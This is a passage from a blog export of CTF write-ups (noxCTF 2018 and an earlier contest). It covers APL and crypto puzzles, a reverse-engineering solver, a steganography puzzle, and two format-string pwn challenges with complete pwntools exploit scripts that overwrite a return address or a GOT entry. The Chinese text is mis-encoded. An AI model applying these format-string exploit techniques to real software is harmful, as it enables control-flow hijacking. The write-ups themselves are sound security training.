chr(int(line, 2)) line = '' print retif __name__ == '__main__': main() å»æ‰å¾—åˆ°çš„å­—ç¬¦ä¸²åé¢çš„hhhhhï¼Œå› ä¸ºæ˜æ˜¾ä¸åƒåŠ å¯†åçš„å†…å®¹ï¼Œ\bå°è¯•base64æ— æœåï¼Œç”¨DESè§£å¯†ï¼Œå¯†é’¥å³ä¸ºä¸€å¼€å§‹å¾—åˆ°çš„ctfer2333ï¼Œå¾—åˆ°flagã€‚ welcomeè§£å‹åç”¨catæŠŠæ‰€æœ‰çš„æ–‡ä»¶åˆå¹¶ï¼Œå¾—åˆ°ä¸€ä¸ªzipæ–‡ä»¶ï¼Œçˆ†ç ´å¯†ç å¾—åˆ°flagã€‚ CRYPTOshanghaiç»´å‰å°¼äºšè§£å¯†ï¼Œåœ¨çº¿è§£å¯†ï¼Œç›´æ¥å¾—åˆ°flagã€‚ åŒæ—¶è¿˜å¾—åˆ°å¯†é’¥æ˜¯icqvigenereã€‚ aplä¹‹å‰PladCTFæœ‰ä¸€é“ç±»ä¼¼çš„é¢˜ç›®ï¼Œåœ¨xmançš„æ—¶å€™ä¹Ÿåˆ†æè¿‡ã€‚ aplæœ€å¤§çš„ç‰¹ç‚¹æ˜¯ä»å³å¾€å·¦è®¡ç®—ã€‚âµä»£è¡¨å³ä¾§çš„å˜é‡ï¼ŒÎ±ä»£è¡¨å·¦ä¾§çš„å˜é‡ã€‚ ä¸€å¼€å§‹ç»™äº†ä¸€é•¿ä¸²base64å­—ç¬¦ä¸²ï¼Œè§£å¯†åå¾—åˆ°aplï¼š 1&#123;âµ(~âµ)/(&apos;No_Please_continue&apos;)(&apos;Yes,This_is_flag&apos;)&#125;(âˆŠ(41(41)0+140)(â•UCS(&apos;ÂµÄ›Â»Ã•Ä€$#Ä$Ã¨Ã¡Ã‹ÄÄÄ`Ã¢ÃÄ Â#&quot;!Ä &quot;KE(Â©$#Ä$Q&lt;k&apos;))146)&#123;+/âºâ‰ 33+2âŠ¥(1(5)Ã—8)â´âˆŠ&#123;aâ‰ 8â†‘(1,aâ†(8â´2)âŠ¤âµ)&#125;Â¨2âŠ¥8(+/â´â³(7*2)-âŒŠ9.1âŒŠâ´&apos;FlagIsWhat&apos;)â´10âŠ–âŠ–âŒ½(âˆŠ4(â´â´88888)+16)â´(1+(|Â¯8)â´1)âŠ¤â•UCS(âµ)&#125;&apos;YourFlagIsWhat?&apos; å…ˆåˆ†æˆå‡ ä¸ªéƒ¨åˆ†ï¼š 12. ```(âˆŠ(41(41)0+140)(â•UCS(&apos;ÂµÄ›Â»Ã•Ä€$#Ä$Ã¨Ã¡Ã‹ÄÄÄ`Ã¢ÃÄ Â#&quot;!Ä &quot;KE(Â©$#Ä$Q&lt;k&apos;))146)``` ==&gt; ```181 181 140 181 283 187 213 256 36 35 286 36 232 225 203 286 286 285 96 226 222 288 92 120 57 100 35 34 33 288 34 75 69 40 169 36 35 286 36 81 60 107 146 123456789101112131415å†é€šè¿‡ä¸»è¦åŠ å¯†è¿‡ç¨‹åˆ†æï¼Œæ ¹æ®aplçš„ç‰¹æ€§åº”è¯¥å€’ç€æ¥ï¼š1. `(1+(|Â¯8)â´1)âŠ¤â•UCS(âµ)` ==&gt; å°†asciiè½¬æ¢æˆäºŒè¿›åˆ¶2. `(âˆŠ4(â´â´88888)+16)` ==&gt; 20 16ï¼Œå³å°†å³ä¾§çš„çŸ©é˜µå¡«å……ä¸º20*163. `10âŠ–âŠ–âŒ½` ==&gt; å°†çŸ©é˜µçš„è¡Œå€’åºï¼Œåˆ—å‘ä¸Š\bä½ç§»104. `8(â´â³(7*2)-âŒŠ9.1âŒŠâ´&apos;FlagIsWhat&apos;)` ==&gt; 8 40ï¼Œå³å°†å³ä¾§çš„çŸ©é˜µå¡«å……ä¸º8*405. `2âŠ¥` ==&gt; å°†äºŒè¿›åˆ¶è½¬æ¢æˆascii6. `&#123;aâ‰ 8â†‘(1,aâ†(8â´2)âŠ¤âµ)&#125;` ==&gt; x ^ (x &gt;&gt; 1)7. `+/âºâ‰ 33+2âŠ¥(1(5)Ã—8)` ==&gt; `Â¨`æŒ‰åˆ—è¯»å–çŸ©é˜µï¼Œç„¶åç»è¿‡ä¸Šä¸€æ­¥çš„ç§»ä½å¼‚æˆ–ï¼Œè½¬ä¸ºasciiç å¹¶åŠ ä¸Š33æ¥ä¸‹æ¥æŒ‰æ­¥éª¤é€†å‘å³å¯ï¼š```aplâ•UCS(2âŠ¥(8 40)â´âŒ½âŠ–10âŠ–(20 16)â´(8â´2)âŠ¤(106 202 104 193 192 206 201 100 192 194 204 194 75 200 206 106 193 75 192 201 201 194 75 206 196 98 206 75 196 192 201 108 198 204 100 193 46 40 35 38)) å‚è€ƒç½‘ç«™https://www.jianshu.com/p/005bda1f8535https://www.anquanke.com/post/id/158386#h3-5https://xz.aliyun.com/t/2665https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3whttps://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realismhttps://www.jianshu.com/p/005bda1f8535https://blog.csdn.net/whklhhhh/article/details/81950438https://xz.aliyun.com/t/2614https://blog.csdn.net/whklhhhh/article/details/82217266https://xz.aliyun.com/t/2666","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2018-noxCTF-writeup","slug":"2018-noxCTF-writeup","date":"2018-09-10T10:01:51.000Z","updated":"2018-11-11T05:02:54.378Z","comments":true,"path":"2018/09/10/2018-noxCTF-writeup/","link":"","permalink":"https://qianfei11.github.io/2018/09/10/2018-noxCTF-writeup/","excerpt":"è®°å½•å‡ é“ç®€å•é¢˜ã€‚","text":"è®°å½•å‡ é“ç®€å•é¢˜ã€‚ RE-GuessTheStringæŠŠæ¯ä¸ªcheckåˆ†è¾¨å‡ºæ¥ï¼Œç„¶åé€ä¸€åˆ†æï¼Œå…ˆåˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦ï¼š 1234_BOOL8 __fastcall check1(const char *a1)&#123; return strlen(a1) == 11;&#125; åˆ¤æ–­æ¯ä¸ªå­—ç¬¦æ˜¯å¦éƒ½å¤§äº32ï¼š 12345678910__int64 __fastcall check2(_BYTE *s)&#123; char *v2; // [rsp+0h] [rbp-18h] _BOOL4 i; // [rsp+14h] [rbp-4h] v2 = s; for ( i = 1; i &amp;&amp; *v2; i = bigger_than_32(*v2++) ) ; return (unsigned int)i;&#125; ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ç­‰äº66ä¸”ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ç¬¬äºŒä¸ªå­—ç¬¦çš„ä¹˜ç§¯ä¸º3478ï¼Œå¯åˆ†è§£è´¨å› æ•°æ±‚è§£ï¼š 123456789101112131415__int64 __fastcall check3(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( *s == 66 ) &#123; v2 = 0; &#125; else if ( *s * s[1] != 3478 ) &#123; v2 = 0; &#125; return v2;&#125; å‰ä¸‰ä¸ªæ•°è¿ç»­å¼‚æˆ–å¾—åˆ°49: 123456789__int64 __fastcall check4(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( ((unsigned __int8)(s[1] ^ *s) ^ (unsigned __int8)s[2]) != 49 ) v2 = 0; return v2;&#125; ç¬¬å››ä¸ªæ•°å¤§äºç¬¬ä¸‰ä¸ªæ•°ï¼Œä½†æ˜¯ä¸¤è€…å¹³æ–¹å’Œç›¸ç­‰ï¼Œæ˜¾ç„¶æ˜¯æº¢å‡ºï¼Œåœ¨è®¡ç®—ä¸­é€šè¿‡æ¨¡256ï¼ˆå³0xFFï¼‰æ¥å®ç°ï¼š 12345678910111213141516__int64 __fastcall check5(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( s[3] &gt; s[2] ) &#123; if ( s[2] * s[2] != s[3] * s[3] ) v2 = 0; &#125; else &#123; v2 = 0; &#125; return v2;&#125; æ¥ä¸‹æ¥è¿˜å‡ºç°äº†ä¸€ä¸ªæ£€æŸ¥ç´ æ•°çš„å‡½æ•°ï¼š 1234567891011121314151617181920212223__int64 __fastcall check_prime(char c)&#123; signed int i; // [rsp+Ch] [rbp-8h] unsigned int v3; // [rsp+10h] [rbp-4h] v3 = 1; if ( (unsigned __int8)c &gt; 1u ) &#123; if ( (unsigned __int8)c &gt; 2u ) &#123; for ( i = 2; v3 &amp;&amp; i &lt; (unsigned __int8)c; ++i ) &#123; if ( !((unsigned __int8)c % i) ) v3 = 0; &#125; &#125; &#125; else &#123; v3 = 0; &#125; return v3;&#125; ç¬¬äº”å’Œç¬¬å…­ä¸ªå­—ç¬¦ç›¸äº’å¼‚æˆ–ç­‰äº126ï¼š 1234567891011121314151617181920212223__int64 __fastcall check6(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( (unsigned int)check_prime(s[4]) ) &#123; if ( (unsigned int)check_prime(s[5]) ) &#123; if ( ((unsigned __int8)s[4] ^ (unsigned __int8)s[5]) != 126 ) v2 = 0; &#125; else &#123; v2 = 0; &#125; &#125; else &#123; v2 = 0; &#125; return v2;&#125; ç¬¬ä¸ƒä¸ªå­—ç¬¦çš„1/2æ˜¯ç´ æ•°ï¼Œä¸”ç¬¬ä¸ƒä¸ªå­—ç¬¦ç­‰äºç¬¬å…­ä¸ªå­—ç¬¦å‡å»42çš„ä¸¤å€ï¼š 12345678910111213141516__int64 __fastcall check7(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( (unsigned int)check_prime(s[6] / 2) ) &#123; if ( s[6] != 2 * (s[5] - 42) ) v2 = 0; &#125; else &#123; v2 = 0; &#125; return v2;&#125; ç¬¬å…«ä¸ªæ•°å­—åœ¨(47, 57]èŒƒå›´å†…ï¼Œå³ç§»ä¸¤ä½åä¹˜å››ç­‰äºæœ¬èº«ï¼š 1234567891011__int64 __fastcall check8(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( s[7] &lt;= 47 || s[7] &gt; 57 ) v2 = 0; if ( 4 * (char)(s[7] &gt;&gt; 2) != s[7] ) v2 = 0; return v2;&#125; ä¼ å…¥\bæ•°å­—ä¸ç¬¬å…«ä¸ªå­—ç¬¦å¼‚æˆ–å¾—åˆ°ç¬¬ä¹ä¸ªå­—ç¬¦ï¼š 1234_BOOL8 __usercall check9@&lt;rax&gt;(unsigned __int8 a1@&lt;efl&gt;, __int64 a2, char *s)&#123; return s[8] == (a1 ^ (unsigned __int8)s[7]);&#125; ä¸¤å€å…³ç³»ï¼š 123456789__int64 __fastcall check10(char *a1)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( 2 * a1[8] != a1[9] ) v2 = 0; return v2;&#125; è®¡ç®—å¾—å‡ºç¬¬åä¸€ä¸ªæ•°å­—ï¼š 123456789101112_BOOL8 __fastcall check11(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, char *a8)&#123; __int64 v8; // rcx __int16 sum; // ax v8 = (unsigned __int8)a8[9]; sum = 0; do sum += v8--; while ( v8 ); return a8[10] == HIBYTE(sum) * (_BYTE)sum;&#125; é€»è¾‘ç›¸å¯¹æ¯”è¾ƒå¸¸è§„ï¼Œä½†åšä¸‹æ¥æœ‰äº›è€—æ—¶ã€‚æœ€åå†™å‡ºè„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647primes = []for i in range(2, 256): for j in range(2, i): if i % j == 0: break else: primes.append(i)s = 11 * [0]# s[0], s[1] = 37, 94 # %^Jv!_j0\"Dz ==&gt; wrongs[0], s[1] = 47, 74 # /JTl!_j0\"Dz ==&gt; rightassert(s[0] * s[1] == 3478)s[2] = s[0] ^ s[1] ^ 49for i in range(s[2] + 1, 256): if i * i % 256 == s[2] * s[2] % 256: s[3] = i breakdef get456(): for i in primes: for j in primes: if i &gt; 32 and j &gt; 32 and (i ^ j) % 256 == 126: if j - 42 in primes and 2 * j &lt; 256: return (i, j, 2 * (j - 42))s[4], s[5], s[6] = get456()for i in range(48, 58): if 4 * (i &gt;&gt; 2) == i: s[7] = i breaks[8] = 0x12 ^ s[7]s[9] = 2 * s[8]s[10] = 0x7Afor c in s: assert(c &gt; 32)print(''.join(map(chr, s))) æ®è¯´è¿™é‡Œå¯ä»¥ç¬¦å·æ‰§è¡Œç”¨angråšã€‚ MISC-Blind Datexxdä¸€ä¸‹æ–‡ä»¶å¤´ï¼Œæ ¹æ®jpegæ–‡ä»¶å¤´ç‰¹å¾å¯ä»¥å‘ç°æ¯å››å­—èŠ‚è¢«å€’è¿‡æ¥äº†ï¼š 1234567891011~ &gt; xxd BlindDate.jpeg | head00000000: e0ff d8ff 464a 1000 0100 4649 6000 0101 ....FJ....FI`...00000010: 0000 6000 2200 e1ff 6669 7845 4d4d 0000 ..`.\"...fixEMM..00000020: 0000 2a00 0100 0800 0300 1201 0100 0000 ..*.............00000030: 0000 0100 0000 0000 1100 ecff 6b63 7544 ............kcuD00000040: 0001 0079 0000 0004 ff00 004b 687e 03e1 ...y.......Kh~..00000050: 3a70 7474 736e 2f2f 6f64 612e 632e 6562 :pttsn//oda.c.eb00000060: 782f 6d6f 312f 7061 002f 302e 7078 3f3c x/mo1/pa./0.px?&lt;00000070: 656b 6361 6562 2074 3d6e 6967 bfbb ef22 ekcaeb t=nig...\"00000080: 6469 2022 3557 223d 704d 304d 6968 6543 di \"5W\"=pM0MiheC00000090: 6572 7a48 544e 7a53 636b 7a63 3f22 6439 erzHTNzSckzc?\"d9 ç”¨è„šæœ¬è¿‡é€†å›æ¥ï¼š 12345678910f = open('BlindDate.jpeg', 'rb')s = f.read()f.close()data = ''for i in range(0, len(s), 4): data += s[i:i + 4][::-1]new_f = open('re_BlindData.jpeg', 'wb')new_f.write(data) stringsä¸€ä¸‹æ–°æ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸²base64å­—ç¬¦ä¸²ï¼š 1Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK è§£å¼€åå‘ç°æ˜¯ç›²æ–‡ï¼š 123.. . .. .. . .. .. . .. . ... . . . . . . . .. .. . .. . . ç¿»è¯‘ä¸€ä¸‹ä¹‹åæ˜¯ï¼šF4C3P4LM binwalkä¸€ä¸‹æ–°æ–‡ä»¶ï¼Œåˆ†è§£å‡ºä¸€ä¸ªå¸¦å¯†ç çš„7zå‹ç¼©æ–‡ä»¶ã€‚æŠŠä¸Šé¢çš„å­—ç¬¦ä¸²ä½œä¸ºå¯†ç è§£å¼€ï¼Œå¾—åˆ°flagæ–‡æœ¬ï¼Œæ˜¯brainfuckï¼š 1++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++.+.+++++++++.&lt;---.+++++++++++++++++.--------------.&gt;+++.&lt;+++++++++++++++++.&lt;++++++++++++++++++.&gt;&gt;------.---------.--------.-----.++++++++++++++++++++++++++.&lt;&lt;.&gt;&gt;----.&lt;++++++++.+++.&gt;---------.&lt;&lt;+.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.&gt;-----.&lt;+.&gt;.+++.&gt;--------.&lt;&lt;---.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.++++++++++++.&gt;&gt;+++++++++.&lt;&lt;&lt;++++++++++++++++++++++. è§£å¯†å¾—åˆ°flagï¼šnoxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?} PWN-believeMeåšå‡ºçš„ç¬¬ä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ‹¿åˆ°é¢˜ç›®å…ˆ\bfile\bä¸€ä¸‹ï¼Œç„¶åå†çœ‹çœ‹å¼€äº†ä»€ä¹ˆä¿æŠ¤ï¼š 123456789[noxCTF-believeMe] file believeMe 1:36:01 believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped[noxCTF-believeMe] checksec believeMe 1:36:06 [*] '/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ç„¶åæ‹–è¿›idaä¸­æŸ¥çœ‹ï¼š 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[40]; // [esp+14h] [ebp-34h] unsigned int v5; // [esp+3Ch] [ebp-Ch] v5 = __readgsdword(0x14u); puts(aSomeoneToldMeT); fflush(stdout); fgets(s, 39, stdin); s[strcspn(s, \"\\n\")] = 0; printf(s); fflush(stdout); return 0;&#125; mainå‡½æ•°ä¸­å¯¹å­—ç¬¦ä¸²é•¿åº¦åšäº†é™åˆ¶ï¼Œå¹¶ä¸”å­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ç„¶åå¾ˆå®¹æ˜“å‘ç°æœ‰ä¸€ä¸ªå¥‡æ€ªçš„å‡½æ•°noxFlagï¼š 12345678910111213141516171819202122232425void __noreturn noxFlag()&#123; char i; // [esp+Bh] [ebp-Dh] FILE *stream; // [esp+Ch] [ebp-Ch] stream = fopen(\"flag.txt\", \"r\"); puts(s); fflush(stdout); if ( stream ) &#123; for ( i = fgetc(stream); i != -1; i = fgetc(stream) ) &#123; putchar(i); fflush(stdout); &#125; fflush(stdout); fclose(stream); &#125; else &#123; puts(\"Can't read file \\n\"); fflush(stdout); &#125; exit(0);&#125; ç”±äºé¢˜ç›®ä¸­æåˆ°ç¯å¢ƒæ˜¯ä¸å¼€å¯ASLRçš„ï¼Œé‚£ä¹ˆè¿™é“é¢˜çš„æ€è·¯å°±å¾ˆæ˜ç¡®ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ³„æ¼å‡ºmainå‡½æ•°retçš„åœ°å€ï¼Œä¿®æ”¹ä¸ºnoxFlagçš„åœ°å€ï¼Œå¾—åˆ°flag.txtçš„å†…å®¹ã€‚ gdbè°ƒè¯•ï¼Œé€šè¿‡æŸ¥çœ‹æ ˆä¸Šçš„å†…å®¹å¾—åˆ°\b\bå­—ç¬¦ä¸²çš„offsetï¼š 1234567891011gdb-peda$ stack 200000| 0xffffceb0 --&gt; 0xffffced4 (&quot;AAAA&quot;)0004| 0xffffceb4 --&gt; 0x804890c --&gt; 0xa (&apos;\\n&apos;)0008| 0xffffceb8 --&gt; 0xf7fb35a0 --&gt; 0xfbad2288 0012| 0xffffcebc --&gt; 0x7f17 0016| 0xffffcec0 --&gt; 0xffffffff 0020| 0xffffcec4 --&gt; 0x2f (&apos;/&apos;)0024| 0xffffcec8 --&gt; 0xf7e0ddc8 --&gt; 0x2b76 (&apos;v+&apos;)0028| 0xffffcecc --&gt; 0xffffcfb4 --&gt; 0xffffd18d (&quot;/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe&quot;)0032| 0xffffced0 --&gt; 0x8000 0036| 0xffffced4 (&quot;AAAA&quot;) å…³äºretçš„åœ°å€ï¼Œä¹Ÿé€šè¿‡åœ¨æ ˆä¸Šçš„è§‚å¯Ÿï¼š 1234567890084| 0xffffce94 --&gt; 0xffffceb0 --&gt; 0x1 0088| 0xffffce98 --&gt; 0x0 0092| 0xffffce9c --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;: add esp,0x10)0096| 0xffffcea0 --&gt; 0xf7fb3000 --&gt; 0x1b1db0 --More--(25/50)0100| 0xffffcea4 --&gt; 0xf7fb3000 --&gt; 0x1b1db0 0104| 0xffffcea8 --&gt; 0x0 0108| 0xffffceac --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;: add esp,0x10)0112| 0xffffceb0 --&gt; 0x1 å¯ä»¥çœ‹åˆ°æœ¬åœ°\bretçš„åœ°å€å³ä¸º0xffffceacï¼Œç„¶åéœ€è¦åˆ©ç”¨æ¼æ´ï¼Œæ³„æ¼å‡ºè¿œç¨‹çš„åœ°å€ã€‚ä»”ç»†è§‚å¯Ÿå‘ç°offsetä¸º84å’Œ112å¤„çš„è”ç³»ï¼Œå³åªéœ€è¦æ³„æ¼å‡ºoffsetä¸º84çš„\bå†…å®¹ï¼Œå†å°†ç»“æœå‡å»4å³èƒ½\bå¾—åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šretçš„åœ°å€ã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„payloadè¿˜å¯ä»¥åˆ©ç”¨pwntoolsä¸­çš„ä¸€ä¸ªå‡½æ•°fmtstr_payloadï¼Œç”¨äºè‡ªåŠ¨ç”Ÿæˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚fmtstr_payloadæœ‰ä¸‰ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯intï¼Œç”¨äºè¡¨ç¤ºå–å‚æ•°çš„åç§»ä¸ªæ•°ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯å­—å…¸ï¼Œå­—å…¸çš„æ„ä¹‰æ˜¯å¾€keyçš„åœ°å€ï¼Œå†™å…¥valueçš„å€¼ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°write_sizeï¼Œå¯ä»¥æ”¹å˜payloadçš„å½¢å¼ï¼Œ\bbyteå¯¹åº”%hhnï¼Œshortå¯¹åº”%hnï¼Œintå¯¹åº”%nã€‚ æœ€åå¯ä»¥å†™å‡ºexpï¼š 12345678910111213141516171819from pwn import *# context.log_level = 'DEBUG'local = 0if local: p = process('./believeMe')else: p = remote('18.223.228.52', 13337)flag_addr = 0x0804867Bret_addr = 0xffffdd2c # local: 0xffffd2bcoffset = 9# payload = p32(0xdeadbeef) + '%&#123;&#125;$p'.format(str(offset)) # test offset# payload = '0x%21$08x' # test ret_addr# payload = p32(ret_addr + 2) + p32(ret_addr) + '%2044c%9$hn%32375c%10$hn'payload = fmtstr_payload(offset, &#123;ret_addr:flag_addr&#125;, write_size='short')assert(len(payload) &lt; 39)p.recvuntil('????')# gdb.attach(p, 'b *0x80487d3\\nc')p.sendline(payload)p.interactive() PWN-The Name Calculator\båˆæ˜¯ä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè¿˜æ¶‰åŠåˆ°æ ˆæº¢å‡ºã€‚\bå…ˆåç¼–è¯‘æŸ¥çœ‹mainå‡½æ•°ï¼š 12345678910111213141516171819202122int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+Ch] [ebp-2Ch] int v4; // [esp+28h] [ebp-10h] unsigned int v5; // [esp+2Ch] [ebp-Ch] v5 = __readgsdword(0x14u); puts(\"What is your name?\"); fflush(stdout); read(0, &amp;buf, 0x20u); fflush(stdin); if ( v4 == 0x6A4B825 ) &#123; secretFunc(); &#125; else &#123; puts(\"I've heard better\"); fflush(stdout); &#125; exit(0);&#125; æŸ¥çœ‹ä¸€ä¸‹v4å’Œbufåœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œå‘ç°å¯ä»¥æº¢å‡ºè¿›å…¥secretFuncï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233int secretFunc()&#123; unsigned int v0; // eax int *i; // [esp+8h] [ebp-40h] ssize_t v3; // [esp+18h] [ebp-30h] int buf[7]; // [esp+20h] [ebp-28h] unsigned int v5; // [esp+3Ch] [ebp-Ch] void *retaddr; // [esp+4Ch] [ebp+4h] v5 = __readgsdword(0x14u); v0 = 0; do &#123; buf[v0] = 0; ++v0; &#125; while ( v0 &lt; 7 ); retAddr = (int)retaddr; puts(\"Say that again please\"); fflush(stdout); v3 = read(0, buf, 0x1Bu); *((_BYTE *)buf + v3) = 0; fflush(stdin); for ( i = buf; i &lt; (int *)((char *)&amp;buf[-1] + v3); i = (int *)((char *)i + 1) ) *i ^= 0x5F7B4153u; puts(\"Your name was encrypted using the best encryption in the world\"); printf(\"This is your new name: \"); printf((const char *)buf); fflush(stdout); if ( retaddr != (void *)retAddr ) exit(1); return 0;&#125; ä¸­é—´å¯¹è¾“å…¥çš„bufè¿›è¡Œäº†å¼‚æˆ–ï¼Œä»ç¬¬ä¸€å­—ç¬¦å¼€å§‹ï¼Œæ­¥é•¿ä¸º1ï¼Œæ¯æ¬¡å–\bå››ä¸ªå­—ç¬¦ï¼Œ\bè½¬æ¢ä¸ºintå‹\båä¸ç‰¹å®šæ•°å­—å¼‚æˆ–ï¼Œå¾ªç¯ç›´åˆ°å€’æ•°ç¬¬å››ä¸ªå­—ç¬¦ã€‚åé¢bufè¿™é‡Œçš„\bprintfæ˜æ˜¾å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚\bç„¶ååˆå‘ç°äº†ä¸€ä¸ªsuperSecretFuncå‡½æ•°ï¼š 123456int superSecretFunc()&#123; printf(\"Here is your flag: \"); fflush(stdout); return system(\"cat flag\");&#125; å¤§æ¦‚çŸ¥é“äº†æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹æŸä¸ªretçš„åœ°å€\bï¼Œç„¶ååœ¨superSecretFuncè¿™é‡Œæ‰§è¡Œ\bcat flagã€‚å›å¤´å†çœ‹åˆ°mainå‡½æ•°è°ƒç”¨äº†exitï¼Œè¿™é‡Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹exitçš„gotè¡¨å®ç°è·³è½¬ã€‚ç„¶åå…ˆé€šè¿‡gdbè°ƒè¯•æ‰¾åˆ°\båœ°å€ï¼š 12345678gdb-peda$ pdis exitDump of assembler code for function exit@plt: 0x08048470 &lt;+0&gt;: jmp DWORD PTR ds:0x804a024 0x08048476 &lt;+6&gt;: push 0x30 0x0804847b &lt;+11&gt;: jmp 0x8048400End of assembler dump.gdb-peda$ x/wx 0x804a0240x804a024: 0x08048476 æŸ¥çœ‹æ ˆä¸Šåˆ†å¸ƒï¼Œå¾—åˆ°\bå­—ç¬¦ä¸²çš„åç§»ï¼š 123456789101112130000| 0xffbc27e0 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0004| 0xffbc27e4 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0008| 0xffbc27e8 --&gt; 0x1b 0012| 0xffbc27ec --&gt; 0xf75badfb (&lt;_IO_puts+347&gt;: add esp,0x10)0016| 0xffbc27f0 --&gt; 0xf75c31d7 (&lt;_IO_new_file_sync+7&gt;: add esi,0x149e29)0020| 0xffbc27f4 --&gt; 0xf770d000 --&gt; 0x1b1db0 0024| 0xffbc27f8 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0028| 0xffbc27fc --&gt; 0x804879a (&lt;main+112&gt;: jmp 0x80487bd &lt;main+147&gt;)0032| 0xffbc2800 (&quot;SA&#123;_&quot;)0036| 0xffbc2804 --&gt; 0x0 0040| 0xffbc2808 --&gt; 0x2 0044| 0xffbc280c --&gt; 0xf770d000 --&gt; 0x1b1db0 0048| 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;) æœ€å\bçš„expï¼š 123456789101112131415161718192021222324252627282930313233from pwn import *# context.log_level = 'DEBUG'local = 1if local: p = process('./CAL')else: p = remote('chal.noxale.com', 5678)def xor_op(s): xor_num = 0x5F7B4153 l = list(s) for i in range(len(l) - 4): t = ''.join(l[i:i + 4]) l[i:i + 4] = list(p32(u32(t) ^ xor_num)) return ''.join(l)offset1 = 28v4 = 0x6A4B825offset2 = 12exit_got = 0x804a024super_addr = 0x08048596# gdb.attach(p, 'b *0x8048656')p.recvuntil('name?')payload1 = 'A' * offset1 + p32(v4)p.send(payload1)p.recvuntil('please')payload2 = xor_op(p32(exit_got) + '%34194c%12$hn')assert(len(payload2) &lt; 0x1B)p.send(payload2)p.interactive() å‚è€ƒç½‘ç«™https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-Stringhttps://github.com/imthoe/noxCTF/tree/master/BlindDatehttps://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘","slug":"åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘","date":"2018-09-08T03:37:55.000Z","updated":"2018-09-24T10:35:13.984Z","comments":true,"path":"2018/09/08/åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘/","link":"","permalink":"https://qianfei11.github.io/2018/09/08/åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘/","excerpt":"è®°å½•ä¸€ä¸